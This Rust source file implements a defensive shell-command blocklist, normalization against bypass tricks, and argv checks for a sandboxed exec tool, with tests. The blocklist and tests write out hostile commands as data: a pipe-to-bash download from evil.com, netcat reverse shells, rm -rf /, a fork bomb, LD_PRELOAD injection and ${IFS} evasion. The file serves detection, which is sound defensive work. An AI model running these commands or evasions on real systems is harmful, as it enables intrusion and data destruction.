// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Command blocklist — the safe-by-default security floor for shell exec.
//!
//! Scans the FULL command string (no length cap) after normalizing away the
//! known bypass tricks, then matches ~100 dangerous patterns. Per the spec
//! §3.2 the normalization is layered because each layer closes a real bypass:
//!
//! 1. **NFKC** — fullwidth/confusable Unicode folds to ASCII (`ｒｍ` → `rm`).
//! 2. **Zero-width stripping** — invisible chars NFKC preserves (`r​m` → `rm`).
//! 3. **Whitespace collapse** — runs of whitespace → a single space.
//! 4. **Quote dequoting** — strip `"`/`'`/`\` (`su""do` → `sudo`).
//! 5. **Basename of the first token** — `/usr/bin/sudo rm` → `sudo rm`.
//! 6. **Full-string scan** — an 8000-char pad then `&& rm -rf /` still matches.
//!
//! The match runs against all four projections (lowercased · basename ·
//! dequoted · basename-dequoted) so a pattern hidden behind any one transform
//! is still caught. CRAFT-preserved from the battle-tested brouillon —
//! **do not weaken**: every pattern + layer closes a documented attack.
//!
//! The ARGV half of the floor (program identity · interpreter inline-eval ·
//! `nc -e` · `dd if=`) lives in [`nika_types::exec`] — the ONE predicate the
//! runtime refusal AND the static `nika check` finding judge with (#605 ·
//! the `net::host_in_allowlist` precedent: an L0 leaf both sides depend on,
//! so check ≡ run by construction, no mirrored table to drift). The wrappers
//! below only map its verdict onto [`ShellError::Blocked`].

use nika_kernel::ShellError;
use nika_types::exec::normalize_for_blocklist;

/// Dangerous command patterns (matched case-insensitively after normalization).
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm --recursive",
    "rm --force",
    // Remote code execution (piping downloads to a shell)
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    "eval ",
    // Named pipes (reverse shells)
    "mkfifo",
    // Netcat reverse shells
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Unix shell -c (arbitrary command execution)
    "bash -c",
    "sh -c",
    "zsh -c",
    "dash -c",
    "ksh -c",
    "csh -c",
    "tcsh -c",
    // Interpreter -c (arbitrary code execution)
    "python -c",
    "python2 -c",
    "python3 -c",
    // Indirect command execution via find/xargs
    " -exec ",
    " -execdir ",
    " -delete",
    "xargs ",
    // Privilege escalation
    "sudo ",
    "doas ",
    "pkexec ",
    "su ",
    // Dangerous permission changes
    "chmod 777",
    "chmod -r 777",
    "chmod a+rwx",
    // Base64-encoded payload execution
    "base64 -d |",
    "base64 --decode |",
    "| base64 -d",
    "| base64 --decode",
    // Disk destruction
    "dd if=",
    // Interpreter bypass (scripting runtimes)
    "perl -e",
    "ruby -e",
    "node -e",
    // Piping to interpreter stdin
    "| python",
    "|python",
    "| python3",
    "|python3",
    "| ruby",
    "|ruby",
    "| node",
    "|node",
    "| perl",
    "|perl",
    "| php",
    "|php",
    // Command-wrapper bypass
    "env ",
    "command ",
    "builtin ",
    "nohup ",
    "nice ",
    "timeout ",
    "strace ",
    // Shell builtins for script/coprocess execution
    "source ",
    "coproc ",
    // Bash virtual files for reverse shells
    "/dev/tcp/",
    "/dev/udp/",
    // Windows-specific dangerous patterns
    "del /f",
    "del /s",
    "rd /s /q",
    "rmdir /s /q",
    "format c:",
    "format d:",
    "shutdown /s",
    "shutdown /r",
    "cmd /c",
    "cmd.exe /c",
    "powershell -c",
    "powershell.exe -c",
    "powershell -enc",
    "powershell -encodedcommand",
    "reg delete",
    "sc delete",
    "runas ",
    // System control (Unix)
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
];

/// Shell-mode patterns ALWAYS blocked (structural commands · `shell: true`).
const SHELL_MODE_BLOCKLIST: &[&str] = &["alias ", "function ", "declare -f"];

/// Check a command against the blocklist.
/// so an absolute-path prefix cannot hide a blocklisted program.
fn normalize_first_token_basename(cmd: &str) -> String {
    let mut parts = cmd.splitn(2, ' ');
    let first = parts.next().unwrap_or("");
    let rest = parts.next().unwrap_or("");
    let basename = first.rsplit('/').next().unwrap_or(first);
    if rest.is_empty() {
        basename.to_string()
    } else {
        format!("{basename} {rest}")
    }
}

/// Check a command against the blocklist.
///
/// # Errors
///
/// [`ShellError::Blocked`] when the command (under any normalization
/// projection) contains a blocklisted pattern.
pub(crate) fn check_command(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();

    // Strip shell quoting: `su""do` → `sudo`, `s'u'd'o'` → `sudo`.
    let dequoted: String = lower
        .chars()
        .filter(|c| !matches!(c, '"' | '\'' | '\\'))
        .collect();

    // Basename-resolve the first token under both projections (from the
    // UN-padded strings — a leading space would empty the first token).
    let basename_normalized = normalize_first_token_basename(&lower);
    let basename_dequoted = normalize_first_token_basename(&dequoted);

    // Wrap every haystack in sentinel spaces before matching.
    // `normalize_for_blocklist`'s `split_whitespace().join(" ")` TRIMS both
    // leading and trailing whitespace, so a pattern with a boundary space
    // ("sudo ", "; rm ", " -exec ", "env ") would miss when the command
    // BEGINS or ENDS at the pattern (`foo; rm`, `find -exec`). The sentinels
    // restore those boundaries. Adding spaces can only ADD matches (strictly
    // safe-side · over-blocks at most a harmless operand-less fragment).
    // Guarded by the Gate-6 property test.
    let lower = format!(" {lower} ");
    let basename_normalized = format!(" {basename_normalized} ");
    let dequoted = format!(" {dequoted} ");
    let basename_dequoted = format!(" {basename_dequoted} ");

    for pattern in BLOCKLIST {
        let p = pattern.to_lowercase();
        if lower.contains(&p)
            || basename_normalized.contains(&p)
            || dequoted.contains(&p)
            || basename_dequoted.contains(&p)
        {
            return Err(ShellError::Blocked {
                reason: "command matches security blocklist".to_string(),
            });
        }
    }

    Ok(())
}

/// Check shell-mode-specific patterns (`alias`/`function`/`declare -f`).
///
/// # Errors
///
/// [`ShellError::Blocked`] on a shell-mode blocklisted pattern.
pub(crate) fn check_shell_mode(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();
    for pattern in SHELL_MODE_BLOCKLIST {
        if lower.contains(pattern) {
            return Err(ShellError::Blocked {
                reason: format!("shell-mode blocklisted pattern: {pattern}"),
            });
        }
    }
    // SECURITY (Gate-11 swarm + review P1): `sh -c` performs EXPANSION after
    // this static check — the structural TOCTOU class. `$VAR`/`${IFS}`/`$(…)`/
    // backticks render `rm${IFS}-rf${IFS}/` → `rm -rf /`; pathname globbing
    // (`* ? [`), brace `{…}`, and tilde `~` render `/usr/bin/sud*` → `sudo`;
    // a `(…)` sub-shell / process-substitution runs a nested program. A
    // baseline mechanism cannot predict any of these, so it REFUSES the
    // expansion / substitution / grouping chars outright. Pipes `|` and
    // redirects `<`/`>` are NOT expansion — they stay allowed. (NFKC has
    // folded the fullwidth `＄` U+FF04 → `$`.) A genuine need goes through
    // nika-policy, which sets `pre_validated` — this check is then skipped.
    if let Some(c) = normalized
        .chars()
        .find(|&c| matches!(c, '$' | '`' | '*' | '?' | '[' | '{' | '~' | '('))
    {
        return Err(ShellError::Blocked {
            reason: format!(
                "shell-mode expansion/substitution char refused: {c:?} (route via pre_validated)"
            ),
        });
    }
    Ok(())
}

/// Check a full argv-form command at the floor: the program IDENTITY
/// (the dangerous-basename list) PLUS the structural re-exec class that
/// shell mode blocks but a name-only check misses — an interpreter invoked
/// with an inline-eval flag or subcommand (`["sh","-c",…]` ·
/// `["python","-c",…]` · `["perl","-e",…]` · `["deno","eval",…]`),
/// `nc -e`/`-c` (reverse shell), `dd if=`/`of=` (raw disk). The judgment
/// itself is [`nika_types::exec::argv_floor_refusal`] — the SAME predicate
/// `nika check` evaluates statically (#605), so a workflow the check
/// passes the run never refuses here, and vice versa.
///
/// # Errors
///
/// [`ShellError::Blocked`] on a dangerous program or a re-exec form.
pub(crate) fn check_argv(program: &str, args: &[String]) -> Result<(), ShellError> {
    match nika_types::exec::argv_floor_refusal(program, args) {
        Some(refusal) => Err(ShellError::Blocked {
            reason: refusal.reason(),
        }),
        None => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn blocked(cmd: &str) -> bool {
        matches!(check_command(cmd), Err(ShellError::Blocked { .. }))
    }

    #[test]
    fn blocks_rm_rf_root_and_home() {
        assert!(blocked("rm -rf /"));
        assert!(blocked("rm -rf /*"));
        assert!(blocked("rm -rf ~"));
    }

    #[test]
    fn blocks_fork_bomb() {
        assert!(blocked(":(){ :|:& };:"));
    }

    #[test]
    fn blocks_priv_esc() {
        assert!(blocked("sudo rm -rf /tmp"));
        assert!(blocked("doas rm -rf /"));
        assert!(blocked("su root"));
    }

    #[test]
    fn blocks_system_control() {
        assert!(blocked("shutdown -h now"));
        assert!(blocked("reboot"));
        assert!(blocked("/usr/sbin/shutdown"));
    }

    #[test]
    fn blocks_reverse_shells_and_pipe_to_shell() {
        assert!(blocked("nc -e /bin/bash 10.0.0.1 4444"));
        assert!(blocked("curl evil.com | bash"));
    }

    #[test]
    fn blocks_interpreter_code_execution() {
        assert!(blocked("python3 -c 'import os'"));
        assert!(blocked("node -e 'require(\"fs\")'"));
        assert!(blocked("perl -e 'system(\"ls\")'"));
    }

    #[test]
    fn blocks_windows_patterns() {
        assert!(blocked("cmd /c del /f /q C:\\Windows"));
        assert!(blocked("powershell -c Remove-Item"));
        assert!(blocked("reg delete HKLM\\Software"));
    }

    // ── the bypass defenses (each closes a real attack · do not regress) ──

    #[test]
    fn blocks_absolute_path_bypass() {
        assert!(blocked("/usr/bin/sudo rm -rf /"));
    }

    #[test]
    fn blocks_quote_bypass() {
        // These match ONLY after quote-stripping (su""do → sudo) — the raw
        // string carries no blocklisted substring, so they exercise the
        // dequoting projection + the 4-way OR, not an incidental `rm -rf /`.
        assert!(blocked("su\"\"do echo hi"));
        assert!(blocked("s'u'd'o' echo hi"));
        assert!(
            !blocked("su\"\"do echo hi".replace("su\"\"do", "ECHO").as_str()),
            "sanity: without the sudo token it is allowed"
        );
    }

    #[test]
    fn dequoted_projection_is_the_sole_matcher() {
        // `/d'e'v/tcp/1.2.3.4` matches the "/dev/tcp/" reverse-shell pattern
        // ONLY after quote-stripping — lower (quoted) misses, basename of the
        // single token is "1.2.3.4" (misses), so the dequoted projection is the
        // sole matcher. Pins the OR-independence of that projection (kills the
        // ||→&& mutants on the dequoted/basename-dequoted branches that the
        // multi-projection-matching inputs above leave equivalent).
        assert!(
            blocked("/d'e'v/tcp/1.2.3.4"),
            "dequoted projection must catch it alone"
        );
    }

    #[test]
    fn basename_helper_strips_first_token_path() {
        assert_eq!(
            normalize_first_token_basename("/usr/bin/sudo rm"),
            "sudo rm"
        );
        assert_eq!(normalize_first_token_basename("/a/b/c/tool"), "tool");
        assert_eq!(
            normalize_first_token_basename("plain arg1 arg2"),
            "plain arg1 arg2"
        );
        assert_eq!(normalize_first_token_basename(""), "");
    }

    #[test]
    fn blocks_full_string_scan_no_length_cap() {
        let evil = format!("{} && rm -rf /", "a".repeat(8000));
        assert!(blocked(&evil));
    }

    #[test]
    fn blocks_nfkc_fullwidth_bypass() {
        // U+FF52 U+FF4D = fullwidth "rm" → NFKC → "rm"
        assert!(blocked("\u{FF52}\u{FF4D} -rf /"));
    }

    #[test]
    fn blocks_zero_width_bypass() {
        // Zero-width space inside "rm" is stripped → "rm -rf /"
        assert!(blocked("r\u{200B}m -rf /"));
    }

    // ── P1 (Gate-11 swarm): shell-expansion TOCTOU bypasses are refused ──

    fn shell_blocked(cmd: &str) -> bool {
        matches!(check_shell_mode(cmd), Err(ShellError::Blocked { .. }))
    }

    #[test]
    fn shell_mode_refuses_ifs_expansion_bypass() {
        // `rm${IFS}-rf${IFS}/` passes check_command (no literal "rm -rf /")
        // but sh -c would expand $IFS to spaces → `rm -rf /`. check_shell_mode
        // must refuse it. (The crucial regression guard for the P1.)
        assert!(
            !blocked("rm${IFS}-rf${IFS}/"),
            "premise: template scan misses it"
        );
        assert!(
            shell_blocked("rm${IFS}-rf${IFS}/"),
            "shell mode must refuse the $ expansion"
        );
    }

    #[test]
    fn shell_mode_refuses_var_indirection_and_subst_and_backtick() {
        assert!(shell_blocked("rm $NIKA_ARGS")); // env-var indirection
        assert!(shell_blocked("echo $(rm -rf /)")); // command substitution
        assert!(shell_blocked("echo `whoami`")); // backtick substitution
        assert!(shell_blocked("rm $'\t'-rf /")); // ANSI-C quoting expansion
    }

    #[test]
    fn shell_mode_refuses_fullwidth_dollar() {
        // NFKC folds fullwidth ＄ (U+FF04) → $, so the confusable is caught too.
        assert!(shell_blocked("rm \u{FF04}{IFS}-rf /"));
    }

    #[test]
    fn shell_mode_allows_plain_pipes_and_redirects() {
        // Legit shell features with NO expansion vector still pass — the
        // pipe/redirect use case (e.g. `yes | head`, `echo x 1>&2`) is intact.
        assert!(check_shell_mode("yes hello | head -c 100").is_ok());
        assert!(check_shell_mode("echo out 1>&2").is_ok());
        assert!(check_shell_mode("ls -la | wc -l").is_ok());
    }

    #[test]
    fn shell_mode_blocks_alias_and_function() {
        assert!(matches!(
            check_shell_mode("alias rm='echo safe'"),
            Err(ShellError::Blocked { .. })
        ));
        assert!(matches!(
            check_shell_mode("function rm() { true; }"),
            Err(ShellError::Blocked { .. })
        ));
    }

    // ── safe commands must pass (no false positives) ──

    #[test]
    fn allows_safe_commands() {
        for ok in [
            "echo hello",
            "ls -la",
            "cat file.txt",
            "python3 script.py",
            "npm run build",
            "cargo test",
            "ffmpeg -i input.mp4 output.mp3",
            "git status",
        ] {
            assert!(check_command(ok).is_ok(), "should allow: {ok}");
        }
    }

    #[test]
    fn allows_rm_with_specific_paths() {
        assert!(check_command("rm /tmp/test.txt").is_ok());
        assert!(check_command("rm -f output.log").is_ok());
    }

    // ── Gate 6 PROPERTY (security): the full-string-scan invariant ──
    //
    // EVERY blocklist pattern, wrapped in arbitrary alphanumeric padding,
    // is always blocked. This proves the scan holds for ALL ~100 patterns
    // (not just the hand-picked cases above) — a future pattern that somehow
    // failed to match would be caught here. Alphanumeric padding can't be
    // touched by NFKC / zero-width / dequoting / whitespace-collapse, and
    // substring `contains` is never broken by a prefix, so the pattern's
    // own bytes survive intact.
    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(256))]

        #[test]
        fn every_blocklist_pattern_blocks_under_padding(
            idx in 0usize..BLOCKLIST.len(),
            pre in "[a-z0-9]{0,8}",
            suf in "[a-z0-9]{0,8}",
        ) {
            let cmd = format!("{pre}{}{suf}", BLOCKLIST[idx]);
            proptest::prop_assert!(
                blocked(&cmd),
                "pattern {:?} must stay blocked padded as {:?}",
                BLOCKLIST[idx], cmd
            );
        }
    }

    /// Documented over-block: substring matching means the `env ` wrapper
    /// pattern also catches `printenv ` (and `su ` catches `issue `, etc.).
    /// This is the deliberate safe-by-default cost of a simple blocklist —
    /// over-blocking a rare-but-safe command beats under-blocking an attack.
    /// Callers with intent-aware validation set `pre_validated`. A word-
    /// boundary refinement is a Round-2 candidate (swarm to opine).
    #[test]
    fn printenv_is_over_blocked() {
        assert!(blocked("printenv PATH"), "env-wrapper substring over-block");
    }

    // ── argv-mode program floor ──
    //
    // The program-identity matrix (exact basename · confusable fold ·
    // no-dequote) moved WITH the predicate to `nika_types::exec` (#605) —
    // it is pinned there, against the shared floor itself.

    // ── argv re-exec class (check_argv · review P0) ──────────────────

    fn argv_blocked(program: &str, args: &[&str]) -> bool {
        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
        matches!(check_argv(program, &owned), Err(ShellError::Blocked { .. }))
    }

    fn argv_ok(program: &str, args: &[&str]) -> bool {
        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
        check_argv(program, &owned).is_ok()
    }

    #[test]
    fn argv_floor_blocks_interpreter_inline_code() {
        // The re-exec class shell mode forbids must NOT be reachable via argv.
        assert!(argv_blocked("sh", &["-c", "rm -rf /"]));
        assert!(argv_blocked("bash", &["-c", "evil"]));
        assert!(argv_blocked("/usr/bin/python3", &["-c", "import os"]));
        assert!(argv_blocked("perl", &["-e", "system('id')"]));
        assert!(argv_blocked("node", &["-e", "process.exit()"]));
        assert!(argv_blocked("ruby", &["-e", "x"]));
        assert!(argv_blocked("node", &["--eval", "x"])); // long form
        assert!(argv_blocked("python", &["-c"])); // the eval flag is the signal
    }

    #[test]
    fn argv_floor_allows_interpreters_on_script_files() {
        // The legit case — an interpreter on a SCRIPT FILE (no eval flag).
        assert!(argv_ok("python3", &["app.py", "--port", "8080"]));
        assert!(argv_ok("node", &["server.js"]));
        assert!(argv_ok("bash", &["deploy.sh", "prod"]));
        assert!(argv_ok("ruby", &["rake", "test"]));
        assert!(argv_ok("python", &["-m", "pytest"])); // -m is module, not eval
    }

    // ── P0-13 (audit UX 2026-07-30): eval flags are PER-INTERPRETER ──
    //
    // The old global flag set (`-c`/`-e`/`-E`/`-r`/`-p` for every
    // interpreter) both over-blocked (`unittest -p <pattern>` · `node -c`
    // syntax check) and under-blocked (`deno eval <code>` — a subcommand,
    // not a flag). The table is per interpreter + positional over argv.

    #[test]
    fn argv_floor_python_m_makes_later_flags_the_modules() {
        // THE false positive of the finding (fixture
        // journey-python-unittest-pattern): after `-m <module>` the rest of
        // argv is the MODULE's — `unittest -p <pattern>` is a pattern flag,
        // not a print-eval.
        assert!(argv_ok(
            "python3",
            &["-m", "unittest", "discover", "tests", "-p", "test_*.py"]
        ));
        assert!(argv_ok("python3", &["-m", "pip", "--version"]));
        // …but python's OWN eval flag still refuses, wherever it sits.
        assert!(argv_blocked("python3", &["-c", "import os"]));
        assert!(argv_blocked("python", &["-v", "-c", "x"]));
    }

    #[test]
    fn argv_floor_node_p_and_print_block_but_c_is_a_syntax_check() {
        // node's eval-print flags refuse; `-c`/`--check` is a SYNTAX CHECK
        // (no code runs) — the global table mis-mapped `-c` onto node.
        assert!(argv_blocked("node", &["-p", "1+1"]));
        assert!(argv_blocked("node", &["--print", "1+1"]));
        assert!(argv_blocked("node", &["-e", "x"]));
        assert!(argv_blocked("node", &["--eval", "x"]));
        assert!(argv_blocked("node", &["-pe", "x"])); // bundled eval-print
        assert!(argv_ok("node", &["-c", "server.js"]));
        assert!(argv_ok("node", &["--check", "server.js"]));
    }

    #[test]
    fn argv_floor_deno_bun_eval_subcommand_blocks() {
        // The reverse false-negative of the finding: `deno eval <code>`
        // re-parses an argument AS code via a SUBCOMMAND the global-flag
        // scan never looked at.
        assert!(argv_blocked("deno", &["eval", "Deno.exit(1)"]));
        assert!(argv_blocked("bun", &["eval", "process.exit(1)"]));
        // …while other subcommands and the node-style flags stay per family.
        assert!(argv_ok("deno", &["run", "server.ts"]));
        assert!(argv_blocked("bun", &["-e", "x"]));
    }

    #[test]
    fn argv_floor_php_perl_ruby_keep_their_own_eval_flags() {
        assert!(argv_blocked("php", &["-r", "system('id');"]));
        assert!(argv_blocked("perl", &["-e", "x"]));
        assert!(argv_blocked("perl", &["-pe", "s/a/b/"])); // bundled eval
        assert!(argv_blocked("ruby", &["-e", "x"]));
        assert!(argv_blocked("ruby", &["-E", "x"]));
        // No cross-family bleed: `-c` is not eval for php/perl/ruby (ruby's
        // `-c` is a syntax check, php's `-l` a lint).
        assert!(argv_ok("ruby", &["-c", "app.rb"]));
        assert!(argv_ok("php", &["-l", "index.php"]));
    }

    #[test]
    fn argv_floor_eval_flags_stop_at_the_script_positional() {
        // Positional argv parsing: the flags AFTER the script file belong to
        // the SCRIPT (they land in its argv), not to the interpreter.
        assert!(argv_ok("python3", &["app.py", "-p", "8080"]));
        assert!(argv_ok("node", &["server.js", "-p", "8080"]));
        // Value-taking interpreter flags consume their operand — scanning
        // resumes after them, so the eval flag is still caught.
        assert!(argv_blocked("python3", &["-X", "faulthandler", "-c", "x"]));
        assert!(argv_blocked("node", &["--require", "ts-node", "-e", "x"]));
    }

    #[test]
    fn argv_floor_blocks_env_reinjection_and_reverse_shells() {
        // `env` re-adds a stripped var into the child → defeats the env scrub.
        assert!(argv_blocked(
            "env",
            &["LD_PRELOAD=/tmp/x.so", "cat", "/secret"]
        ));
        assert!(argv_blocked("/usr/bin/env", &["sh", "-c", "evil"]));
        assert!(argv_blocked("xargs", &["rm"]));
        assert!(argv_blocked("nc", &["-e", "/bin/sh", "10.0.0.1", "4444"]));
        assert!(argv_blocked("ncat", &["-c", "sh"]));
        assert!(argv_blocked("dd", &["if=/dev/sda", "of=/dev/null"]));
    }

    #[test]
    fn argv_floor_allows_ordinary_argv_with_metachar_args() {
        // The Step-2 property holds: a LITERAL arg carrying shell metacharacters
        // (or interpreter-flag TEXT) is NOT a false positive — no shell, and
        // check_argv is structural (per element).
        assert!(argv_ok("echo", &["a; b | c"]));
        assert!(argv_ok("printf", &["%s", "; rm -rf /"]));
        assert!(argv_ok("echo", &["run python -c please"])); // literal text
        assert!(argv_ok("git", &["commit", "-m", "node -e fix"]));
        assert!(argv_ok("nc", &["-l", "8080"])); // listener (no -e/-c)
        assert!(argv_ok("dd", &["--version"])); // no if=/of=
    }

    // ── shell-mode expansion/glob refusal (review P1) ────────────────

    #[test]
    fn shell_mode_refuses_glob_brace_tilde_subshell() {
        // Runtime expansion reconstructs a blocked program past the static scan
        // (`/usr/bin/sud*` → sudo) — the same TOCTOU class as `${IFS}`.
        assert!(shell_blocked("/usr/bin/sud* root")); // glob → sudo
        assert!(shell_blocked("/sbin/rebo*")); // glob → reboot
        assert!(shell_blocked("echo {a,b}")); // brace
        assert!(shell_blocked("cat ~/secret")); // tilde
        assert!(shell_blocked("(reboot)")); // sub-shell
        assert!(shell_blocked("ls ?")); // single-char glob
    }

    #[test]
    fn shell_mode_still_allows_pipes_and_redirects() {
        // Pipes/redirects are NOT expansion — the genuine-pipeline use case the
        // architecture preserves stays allowed.
        assert!(check_shell_mode("cat a.log | grep error").is_ok());
        assert!(check_shell_mode("echo hi > out.txt").is_ok());
        assert!(check_shell_mode("sort < in.txt").is_ok());
    }

    // ── #605: check ≡ run on the argv floor (ONE predicate) ──────────

    /// The issue's agreement law: for the SAME literal argv, the runtime
    /// floor ([`check_argv`]) and the static check (`nika_check::check`'s
    /// `NIKA-SEC-001` finding) must return the SAME verdict — because both
    /// call [`nika_types::exec::argv_floor_refusal`]. The table pins the
    /// issue's own shapes: `bash -c` (refused), `sh -e` (ALLOWED — `e` is
    /// not the shell family's eval letter, and the check must not
    /// over-refuse what the run accepts), plus the benign negative.
    #[test]
    fn check_and_run_agree_on_the_argv_floor() {
        let cases: &[(&[&str], bool)] = &[
            (&["bash", "-c", "echo hello"], true), // the issue's repro
            (&["sh", "-c", "echo hello"], true),
            (&["sh", "-e", "deploy.sh"], false), // errexit, NOT inline eval
            (&["perl", "-e", "system('id')"], true),
            (&["echo", "hi"], false), // the benign negative
        ];
        for (argv, refused) in cases {
            let (program, rest) = argv.split_first().expect("non-empty case");
            let owned: Vec<String> = rest.iter().map(|s| (*s).to_string()).collect();
            let runtime_refused = check_argv(program, &owned).is_err();
            assert_eq!(
                runtime_refused, *refused,
                "runtime floor verdict for {argv:?}"
            );

            let list = argv
                .iter()
                .map(|a| format!("\"{a}\""))
                .collect::<Vec<_>>()
                .join(", ");
            let yaml = format!(
                "nika: w\npermits:\n  exec: true\ntasks:\n  t:\n    exec: {{ command: [{list}] }}\n"
            );
            let wf = nika_schema::parser::parse(
                &yaml,
                nika_schema::source::FileId::new(0),
                nika_schema::parser::ParseMode::Strict,
            )
            .expect("fixture parses");
            let report = nika_check::check(&wf);
            let static_refused = report
                .findings
                .iter()
                .any(|f| f.code.as_deref() == Some("NIKA-SEC-001"));
            assert_eq!(
                static_refused, *refused,
                "static check verdict for {argv:?} (findings: {:?})",
                report.findings
            );
            assert_eq!(
                static_refused, runtime_refused,
                "check ≡ run on {argv:?} — the #605 law"
            );
        }
    }
}
